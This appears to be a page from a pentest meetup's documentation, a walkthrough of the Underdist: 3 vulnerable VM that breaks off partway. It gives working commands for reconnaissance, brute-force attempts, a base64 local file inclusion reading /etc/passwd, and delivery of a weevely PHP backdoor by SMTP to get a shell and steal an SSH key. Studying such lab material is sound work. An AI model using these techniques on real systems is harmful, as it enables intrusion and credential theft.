@@ -1,0 +1,702 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>3.9. Underdist: 3 &mdash; South Bay WASP 1.0.2 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  
+  
+    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  
+
+  
+
+  
+        <link rel="index" title="Index"
+              href="../genindex.html"/>
+        <link rel="search" title="Search" href="../search.html"/>
+    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
+        <link rel="up" title="3. Pentest Challenges" href="../pentest_challenges.html"/>
+        <link rel="next" title="3.10. Kioptrix Level 5" href="kioptrix5.html"/>
+        <link rel="prev" title="3.8. De-ICE Level 1" href="de-ice1.html"/> 
+
+  
+  <script src="../_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+   
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> South Bay WASP
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="virtual_machine_setup.html">3.1. Virtual Machine Setup</a></li>
+<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.2. OwlNest</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.3. De-ICE Level 6</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.4. De-ICE Level 5</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.5. De-ICE Level 4</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.8. De-ICE Level 1</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">3.9. Underdist: 3</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#setup">3.9.1. Setup</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#setting-up-the-vmware-vm">3.9.1.1. Setting up the VMware VM</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#setting-up-your-environment">3.9.1.2. Setting up your environment</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#reconnaisance">3.9.2. Reconnaisance</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#network-reconnaissance">3.9.2.1. Network reconnaissance</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#initial-port-reconnaissance">3.9.2.2. Initial port reconnaissance</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#browsing-the-web-server">3.9.2.3. Browsing the web server</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#the-exploit">3.9.3. The Exploit</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#getting-a-reverse-php-shell-via-smtp">3.9.3.1. Getting a reverse PHP shell via SMTP</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#exploiting-ssh-access-to-underdist3">3.9.3.2. Exploiting SSH access to underdist3</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.10. Kioptrix Level 5</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.12. Kioptrix Level 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.13. Kioptrix Level 2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.14. Kioptrix Level 1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a></li>
+<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.16. Holynix2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.18. Freshly</a></li>
+<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.19. ZorZ</a></li>
+<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.20. Vulnix</a></li>
+<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
+<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
+<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.24. PentesterLab From SQL injection to Shell</a></li>
+<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
+<li class="toctree-l2"><a class="reference internal" href="natas.html">3.27. Natas</a></li>
+<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">South Bay WASP</a>
+        
+      </nav>
+
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
+        
+      <li>3.9. Underdist: 3</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/challenges/underdist3.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="underdist-3">
+<span id="underdist3"></span><h1>3.9. Underdist: 3<a class="headerlink" href="#underdist-3" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="setup">
+<h2>3.9.1. Setup<a class="headerlink" href="#setup" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="setting-up-the-vmware-vm">
+<h3>3.9.1.1. Setting up the VMware VM<a class="headerlink" href="#setting-up-the-vmware-vm" title="Permalink to this headline">¶</a></h3>
+<p>The challenge is <a class="reference external" href="https://www.vulnhub.com/entry/underdist-3,108/">Underdist: 3</a>. The VM comes packaged as <a class="reference external" href="http://download.vulnhub.com/underdist/Underdist-3.zip">Underdist-3.zip</a>, which is a zip archive containing a Virtualbox VDI (VMware vmdk file). See <a class="reference internal" href="virtual_machine_setup.html#vmsetup"><span class="std std-ref">Virtual Machine Setup</span></a> for background on using the VMware vmdk file. underdist3 runs Debian 7 (Wheezy).</p>
+</div>
+<div class="section" id="setting-up-your-environment">
+<h3>3.9.1.2. Setting up your environment<a class="headerlink" href="#setting-up-your-environment" title="Permalink to this headline">¶</a></h3>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/underdist3
+mkdir -p <span class="nv">$PT</span>
+<span class="nb">cd</span> <span class="nv">$PT</span>
+<span class="c1"># download underdist3_setup.sh</span>
+curl --silent --remote-name https://pentest-meetup.appspot.com/html/_downloads/underdist3_setup.sh
+<span class="c1"># edit as needed; later the recon will give you TARGET IP</span>
+<span class="nb">source</span> underdist3_setup.sh
+</pre></div>
+</div>
+<p>The source for <code class="file docutils literal"><span class="pre">underdist3_setup.sh</span></code> (<a class="reference download internal" href="../_downloads/underdist3_setup.sh" download=""><code class="xref download docutils literal"><span class="pre">underdist3_setup.sh</span></code></a>) should look something like the following.</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>
+
+<span class="c1"># *******************************************************</span>
+<span class="c1"># Edit these to match your setup</span>
+<span class="c1"># *******************************************************</span>
+<span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.100          <span class="c1"># ip of underdist3</span>
+<span class="nv">SUBNET</span><span class="o">=</span><span class="m">192</span>.168.1.0/24         <span class="c1"># subnet</span>
+<span class="nv">KALI</span><span class="o">=</span><span class="m">192</span>.168.1.104            <span class="c1"># Kali IP</span>
+<span class="nv">PORT</span><span class="o">=</span><span class="m">4444</span>                     <span class="c1"># reverse shell port</span>
+<span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/underdist3   <span class="c1"># create working directories here</span>
+
+<span class="o">[[</span> <span class="k">$(</span>grep -c underdist3 /etc/hosts<span class="k">)</span> -eq <span class="m">0</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
+  <span class="nb">echo</span> <span class="s2">&quot; add \&quot;</span><span class="nv">$TARGET</span><span class="s2"> underdist3.com\&quot; to /etc/hosts&quot;</span>
+
+<span class="c1"># *******************************************************</span>
+<span class="c1"># Maybe edit these</span>
+<span class="c1"># *******************************************************</span>
+<span class="c1"># Create some directories</span>
+<span class="nv">TOOLS</span><span class="o">=</span>exploit,nmap,spider
+<span class="nb">eval</span> mkdir -p <span class="nv">$PT</span>/<span class="o">{</span><span class="nv">$TOOLS</span><span class="o">}</span>
+<span class="nv">TARGETS</span><span class="o">=</span>targets.txt
+
+<span class="c1"># *******************************************************</span>
+<span class="c1"># Don&#39;t edit these</span>
+<span class="c1"># *******************************************************</span>
+<span class="nv">HOST</span><span class="o">=</span>underdist3.com
+<span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
+<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="reconnaisance">
+<h2>3.9.2. Reconnaisance<a class="headerlink" href="#reconnaisance" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="network-reconnaissance">
+<h3>3.9.2.1. Network reconnaissance<a class="headerlink" href="#network-reconnaissance" title="Permalink to this headline">¶</a></h3>
+<p>Start with some standard network reconnaissance looking for the vulnerable host:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/underdist3
+<span class="nb">source</span> <span class="nv">$PT</span>/underdist3_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/nmap
+
+<span class="nv">$SUDO</span> nmap -sn -PE -oA nmap_sn <span class="nv">$SUBNET</span>
+<span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> nmap_sn.*
+<span class="c1"># use the grep-able output to get a list of target hosts</span>
+grep Up nmap_sn.gnmap <span class="p">|</span> cut -d<span class="s2">&quot; &quot;</span> -f2 &gt; <span class="nv">$TARGETS</span>
+<span class="c1"># use the xml output to get an html report</span>
+xsltproc nmap_sn.xml -o nmap_sn.html
+</pre></div>
+</div>
+<p>Here we know $TARGET and can fill it in $PT/underdist3_setup.sh and also edit <code class="file docutils literal"><span class="pre">/etc/hosts</span></code> to add “underdist3.com” (<code class="docutils literal"><span class="pre">echo</span> <span class="pre">&quot;$TARGET</span> <span class="pre">underdist3.com&quot;</span> <span class="pre">|</span> <span class="pre">$SUDO</span> <span class="pre">tee</span> <span class="pre">-a</span> <span class="pre">/etc/hosts</span></code>).</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/underdist3
+<span class="nb">source</span> <span class="nv">$PT</span>/underdist3_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/nmap
+
+<span class="nv">$SUDO</span> nmap -A -vv -T3 --max-retries <span class="m">5</span> -Pn -oA nmap_A <span class="nv">$TARGET</span>
+<span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> nmap_A.*
+xsltproc nmap_A.xml -o nmap_A.html
+</pre></div>
+</div>
+<p>Running this reveals:</p>
+<ul class="simple">
+<li>port 22: OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)</li>
+<li>port 25: Postfix smtpd</li>
+<li>port 80: Apache httpd 2.2.22 ((Debian))</li>
+</ul>
+<p>The servers indicate Debian 7 (see <a class="reference external" href="https://packages.debian.org/wheezy/openssh-server">Wheezy Package: openssh-server (1:6.0p1-4+deb7u2)</a> and <a class="reference external" href="https://packages.debian.org/wheezy/apache2">Wheezy Package: apache2 (2.2.22-13+deb7u4)</a>).</p>
+</div>
+<div class="section" id="initial-port-reconnaissance">
+<h3>3.9.2.2. Initial port reconnaissance<a class="headerlink" href="#initial-port-reconnaissance" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="port-22-25-reconnaissance-via-hydra">
+<h4>3.9.2.2.1. Port 22 &amp; 25 reconnaissance via hydra<a class="headerlink" href="#port-22-25-reconnaissance-via-hydra" title="Permalink to this headline">¶</a></h4>
+<p>SSH reconnaissance shows SSH “does not support password authentication”:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">hydra -l underdist -P /usr/share/wordlists/metasploit-jtr/password.lst -t 16 underdist3.com ssh</span>
+<span class="gp">#</span> <span class="o">[</span>ERROR<span class="o">]</span> target ssh://192.168.1.100:22/ does not support password authentication.
+</pre></div>
+</div>
+<p>SMTP reconnaissance shows “[ERROR] SMTP LOGIN AUTH, either this auth is disabled
+or server is not using auth: 503 5.5.1 Error: authentication not enabled”:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">hydra -l underdist -P /usr/share/wordlists/metasploit-jtr/password.lst -t 16 underdist3.com smtp</span>
+<span class="gp">#</span> <span class="nv">OUTPUT</span> <span class="o">=</span> <span class="o">[</span>ERROR<span class="o">]</span> SMTP LOGIN AUTH, either this auth is disabled
+<span class="gp">#</span> or server is not using auth: <span class="m">503</span> <span class="m">5</span>.5.1 Error: authentication not enabled
+</pre></div>
+</div>
+<p>So we’re not brute-forcing passwords through ports 22 or 25.</p>
+</div>
+<div class="section" id="port-80-reconnaissance-via-dirb-nikto">
+<h4>3.9.2.2.2. Port 80 reconnaissance via dirb &amp; nikto<a class="headerlink" href="#port-80-reconnaissance-via-dirb-nikto" title="Permalink to this headline">¶</a></h4>
+<p>Out of habit we do <strong class="program">dirb</strong> and <strong class="program">nikto</strong> scans.</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/underdist3
+<span class="nb">source</span> <span class="nv">$PT</span>/underdist3_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/spider
+
+nikto -output nikto.html -C all -host <span class="nv">$HOST</span> -port <span class="m">80</span>
+dirb  http://<span class="nv">$HOST</span>/ -o dirb80.txt
+</pre></div>
+</div>
+<p><strong class="program">dirb</strong> on port 80 found <code class="file docutils literal"><span class="pre">index.html</span></code>, <code class="file docutils literal"><span class="pre">server-status</span></code>, and directories <code class="file docutils literal"><span class="pre">cgi-bin</span></code> and <code class="file docutils literal"><span class="pre">ascii</span></code>.</p>
+<p><strong class="program">nikto</strong> reported very little not already known.</p>
+</div>
+</div>
+<div class="section" id="browsing-the-web-server">
+<h3>3.9.2.3. Browsing the web server<a class="headerlink" href="#browsing-the-web-server" title="Permalink to this headline">¶</a></h3>
+<p><code class="file docutils literal"><span class="pre">index.html</span></code> contains a commented link <code class="docutils literal"><span class="pre">&lt;a</span> <span class="pre">href=&quot;v.php?a=YXNjaWkxLnR4dA==&quot;&gt;</span></code> which base64 decodes to <code class="docutils literal"><span class="pre">&lt;a</span> <span class="pre">href=&quot;v.php?a=ascii1.txt&quot;&gt;</span></code>. With it we have a LFI (local file inclusion) exploit. Here we illustrate getting <code class="file docutils literal"><span class="pre">/etc/passwd</span></code>:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/underdist3
+<span class="nb">source</span> <span class="nv">$PT</span>/underdist3_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/spider
+
+<span class="nv">FILE</span><span class="o">=</span><span class="s2">&quot;/etc/passwd&quot;</span>
+<span class="nv">FILEPATH</span><span class="o">=</span><span class="s2">&quot;../../../../../..</span><span class="nv">$FILE</span><span class="s2">&quot;</span>
+<span class="nv">B64FP</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="s2">&quot;</span><span class="nv">$FILEPATH</span><span class="s2">&quot;</span> <span class="p">|</span> base64<span class="k">)</span>
+curl --silent http://underdist3.com/v.php?a<span class="o">=</span><span class="nv">$B64FP</span>
+</pre></div>
+</div>
+<p>Here are the interesting lines from <code class="file docutils literal"><span class="pre">/etc/passwd</span></code>:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">root:x:0:0:root:/root:/bin/bash</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">www-data:x:33:33:www-data:/var/www:/bin/sh</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">underdist:x:1000:1000:underdist,,,:/home/underdist:/bin/bash</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">cuervo:x:1001:1001:,,,:/home/cuervo:/bin/bash</span>
+<span class="go">smmta:x:107:111:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false</span>
+<span class="go">smmsp:x:108:112:Mail Submission Program,,,:/var/lib/sendmail:/bin/false</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="the-exploit">
+<h2>3.9.3. The Exploit<a class="headerlink" href="#the-exploit" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="getting-a-reverse-php-shell-via-smtp">
+<h3>3.9.3.1. Getting a reverse PHP shell via SMTP<a class="headerlink" href="#getting-a-reverse-php-shell-via-smtp" title="Permalink to this headline">¶</a></h3>
+<p>At this point we’d like to get a remote exploit but the software versions appear to be recent enough to not be subject to easy remote exploits. SSH avoids password login so that’s a dead end, too. And HTTP so far has yielded at most file downloads. Perhaps we can deliver an SMTP message containing a reverse PHP script.</p>
+<div class="section" id="overcoming-smtp-message-restrictions">
+<h4>3.9.3.1.1. Overcoming SMTP message restrictions<a class="headerlink" href="#overcoming-smtp-message-restrictions" title="Permalink to this headline">¶</a></h4>
+<p>From <a class="reference external" href="http://mailformat.dan.info/body/linelength.html">Dan’s Mail Format Site: Body: Line Length</a>:</p>
+<blockquote>
+<div><p>The standards document for the format of e-mail messages, RFC 2822 (the successor to RFC 822, the classic document that established the standards that have been followed ever since), says this about the length of lines in an e-mail message:</p>
+<blockquote>
+<div>There are two limits that this standard places on the number of characters in a line. Each line of characters MUST be no more than 998 characters, and SHOULD be no more than 78 characters, excluding the CRLF.</div></blockquote>
+<p>Update: As of 2008, a new document, RFC 5322, has been released to update the standard; however, it retains the above wording regarding line length.</p>
+</div></blockquote>
+<p>So when sending a PHP script over SMTP, care must be given for the line length. For example, if you were to base64 encode the pentestmonkey PHP reverse shell it’s single line is over 7300 characters - far too long. Trying to email <code class="docutils literal"><span class="pre">&lt;?php</span> <span class="pre">eval(base64_decode(&quot;'$B64RS'&quot;);?&gt;</span></code> (where $B64RS is the base64-encdoded reverse shell) might be a problem.</p>
+</div>
+<div class="section" id="getting-a-php-reverse-shell-to-work">
+<h4>3.9.3.1.2. Getting a PHP reverse shell to work<a class="headerlink" href="#getting-a-php-reverse-shell-to-work" title="Permalink to this headline">¶</a></h4>
+<p>We normally take the pentestmonkey PHP reverse shell; make the normal edits to connect to our Kali ip and port; then make additional edits to use a pty instead of a pipe. That would not connect. Reverting to only change the Kali ip and port would connect and immediately terminate with no output. The fact it connected at all indicated that the SMTP approach could work, but more work was needed. And we’re here to exploit, not do blind debugging.</p>
+<p>So we searched for an alternative and came up with <a class="reference external" href="https://github.com/epinna/weevely3">epinna/weevely3</a> which is installed by default in Kali.</p>
+</div>
+<div class="section" id="what-mail-is-local-and-where-s-the-mailbox">
+<h4>3.9.3.1.3. What mail is local and where’s the mailbox?<a class="headerlink" href="#what-mail-is-local-and-where-s-the-mailbox" title="Permalink to this headline">¶</a></h4>
+<p>First, what mail is considered local? The <strong class="program">postfix</strong> <code class="file docutils literal"><span class="pre">/etc/postfix/main.cf</span></code> configuration file entry “mydestination” entry defines the local mail (here we’ll use “&#64;Underdist”):</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/underdist3
+<span class="nb">source</span> <span class="nv">$PT</span>/underdist3_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
+
+<span class="nv">FILE</span><span class="o">=</span><span class="s2">&quot;/etc/postfix/main.cf&quot;</span>
+<span class="nv">FILEPATH</span><span class="o">=</span><span class="s2">&quot;../../../../../..</span><span class="nv">$FILE</span><span class="s2">&quot;</span>
+<span class="nv">B64FP</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="s2">&quot;</span><span class="nv">$FILEPATH</span><span class="s2">&quot;</span> <span class="p">|</span> base64<span class="k">)</span>
+curl --silent http://underdist3.com/v.php?a<span class="o">=</span><span class="nv">$B64FP</span>
+<span class="c1"># OUTPUT = mydestination = home.lan, Underdist, localhost.localdomain, localhost</span>
+</pre></div>
+</div>
+<p>Second, where does the mail go? The <code class="file docutils literal"><span class="pre">/etc/login.defs</span></code> shows the default mail directory is <code class="file docutils literal"><span class="pre">/var/mail/</span></code> (and mail goes to <code class="file docutils literal"><span class="pre">/var/mail/$USER</span></code>):</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/underdist3
+<span class="nb">source</span> <span class="nv">$PT</span>/underdist3_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
+
+<span class="nv">FILE</span><span class="o">=</span><span class="s2">&quot;/etc/login.defs&quot;</span>
+<span class="nv">FILEPATH</span><span class="o">=</span><span class="s2">&quot;../../../../../..</span><span class="nv">$FILE</span><span class="s2">&quot;</span>
+<span class="nv">B64FP</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="s2">&quot;</span><span class="nv">$FILEPATH</span><span class="s2">&quot;</span> <span class="p">|</span> base64<span class="k">)</span>
+curl --silent http://underdist3.com/v.php?a<span class="o">=</span><span class="nv">$B64FP</span>
+<span class="c1"># OUTPUT = MAIL_DIR        /var/mail</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="uploading-the-reverse-php-shell">
+<h4>3.9.3.1.4. Uploading the reverse PHP shell<a class="headerlink" href="#uploading-the-reverse-php-shell" title="Permalink to this headline">¶</a></h4>
+<p>First we create the weevely PHP reverse shell:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/underdist3
+<span class="nb">source</span> <span class="nv">$PT</span>/underdist3_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
+
+<span class="nv">PASSWORD</span><span class="o">=</span>password   <span class="c1"># password for connecting to PHP reverse shell</span>
+<span class="nv">REVSH</span><span class="o">=</span>backdoor.php  <span class="c1"># reverse shell filename</span>
+weevely generate <span class="nv">$PASSWORD</span> <span class="nv">$REVSH</span>
+</pre></div>
+</div>
+<p>Then we upload via email using <strong class="program">socat</strong>’s built-in <strong class="program">mail.sh</strong>:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/underdist3
+<span class="nb">source</span> <span class="nv">$PT</span>/underdist3_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
+
+cat <span class="nv">$REVSH</span> <span class="p">|</span> <span class="se">\</span>
+socat EXEC:<span class="s2">&quot;/usr/share/doc/socat/examples/mail.sh -f hacker@kali www-data@Underdist&quot;</span>,fdin<span class="o">=</span><span class="m">3</span>,fdout<span class="o">=</span><span class="m">4</span> TCP4:underdist3.com:25,crnl
+</pre></div>
+</div>
+</div>
+<div class="section" id="exploiting-the-php-reverse-shell">
+<h4>3.9.3.1.5. Exploiting the PHP reverse shell<a class="headerlink" href="#exploiting-the-php-reverse-shell" title="Permalink to this headline">¶</a></h4>
+<p>Now we fire off the PHP reverse shell:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/underdist3
+<span class="nb">source</span> <span class="nv">$PT</span>/underdist3_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
+
+<span class="nv">B64REVSH</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="s2">&quot;../../../../var/mail/www-data&quot;</span> <span class="p">|</span> base64<span class="k">)</span>
+<span class="nv">B64REVSH</span><span class="o">=</span><span class="si">${</span><span class="nv">B64REVSH</span><span class="p">%%=*</span><span class="si">}</span>
+weevely http://underdist3.com/v.php?a<span class="o">=</span><span class="nv">$B64REVSH</span> password
+</pre></div>
+</div>
+<p>In the weevely shell, run <code class="docutils literal"><span class="pre">:help</span></code> to get help. We quickly find <code class="file docutils literal"><span class="pre">b_gd214dg/foo.backup</span></code>, download it, and use <code class="kbd docutils literal"><span class="pre">Cntl-D</span></code> to exit <strong class="program">weevely</strong>:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">weevely http://underdist3.com/v.php?a=$B64REVSH password</span>
+<span class="go">:file.ls</span>
+<span class="gp">#</span> <span class="nv">OUTPUT</span> <span class="o">=</span> b_gd214dg
+<span class="go">:file.ls b_gd214dg</span>
+<span class="gp">#</span> <span class="nv">OUTPUT</span> <span class="o">=</span> foo.backup
+<span class="go">:file.download b_gd214dg/foo.backup foo.backup</span>
+<span class="gp">#</span> <span class="nv">OUTPUT</span> <span class="o">=</span> True
+</pre></div>
+</div>
+<p>Back on the Kali side (in another terminal window) we see that foo.backup is a PEM RSA private key and figure out we can SSH to underdist3 as user cuervo:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>file foo.backup
+chmod <span class="m">600</span> foo.backup
+ssh -i foo.backup cuervo@underdist3.com
+</pre></div>
+</div>
+<p>And so we’ve finally got a “normal” login on underdist3 as cuervo.</p>
+</div>
+</div>
+<div class="section" id="exploiting-ssh-access-to-underdist3">
+<h3>3.9.3.2. Exploiting SSH access to underdist3<a class="headerlink" href="#exploiting-ssh-access-to-underdist3" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="getting-from-cuervo-to-underdist-ssh-access">
+<h4>3.9.3.2.1. Getting from cuervo to underdist SSH access<a class="headerlink" href="#getting-from-cuervo-to-underdist-ssh-access" title="Permalink to this headline">¶</a></h4>
+<p>The prior section left off with SSH login as cuervo. Quickly you realize cuervo doesn’t have any special <code class="docutils literal"><span class="pre">sudo</span> <span class="pre">-l</span></code> access and reconnaissance turns up these files in <code class="file docutils literal"><span class="pre">/home/underdist</span></code> (with the now-inaccessible <code class="file docutils literal"><span class="pre">.bin</span></code> directory):</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">cd /home/underdist</span>
